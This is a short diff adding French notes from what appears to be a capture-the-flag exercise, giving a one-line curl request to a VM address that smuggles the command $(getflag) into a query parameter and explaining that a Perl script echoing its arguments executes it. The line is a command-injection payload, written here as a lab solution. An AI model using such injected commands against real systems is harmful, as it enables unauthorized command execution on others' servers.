@@ -1,0 +1,5 @@
+curl 10.0.2.15:4747?x=$(getflag)
+
+(ça fait longtemps mais il me semble bien que c'est l'address de la vm)
+
+le script pearl echo ses arguments du coup on met getflag avec la balise pour qu'echo execute la fonction
